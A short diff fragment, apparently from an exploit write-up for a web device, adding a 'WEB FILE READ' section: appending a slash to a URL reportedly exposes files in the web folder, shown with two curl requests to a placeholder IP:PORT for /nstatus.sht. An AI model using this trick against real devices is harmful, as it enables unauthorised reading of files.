@@ -20,3 +20,10 @@ Connection: close
 
 file content
 ---
+
+** WEB FILE READ **
+
+You can read all the files in the webfolder by adding / at the end of the url (you can find default filenames in /files.txt)
+
+curl http://IP:PORT/nstatus.sht
+curl http://IP:PORT/nstatus.sht/
